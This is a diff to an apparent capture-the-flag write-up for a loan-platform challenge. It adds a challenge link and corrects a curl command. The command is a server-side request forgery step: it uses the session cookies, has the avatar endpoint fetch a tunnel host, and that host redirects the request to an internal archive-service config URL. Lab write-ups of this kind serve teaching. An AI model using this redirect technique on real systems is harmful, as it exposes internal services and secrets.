@@ -9,6 +9,8 @@ image:
   path: loan_locked.png
 ---
 
+_<http://172.198.60.104:8081>_
+
 ## Description
 
 Need cash fast? You definitely should check our platform! Instant loan verification, documents archived and encrypted — what could possibly go wrong?
@@ -101,7 +103,7 @@ def do_GET(self):
 and pointed `/profile/avatar` at it, redirecting to the internal archive-service
 
 ```bash
-curl -b cookies.txt -X POST 172.198.60.104:8081/profile/avatar \
+curl -b cookies.txt -X POST http://172.198.60.104:8081/profile/avatar \
   -H "Content-Type: application/json" \
   -d '{"url":"https://<tunnel-host>/?to=http://127.0.0.1:39417/archive/config&code=307"}'
 ```
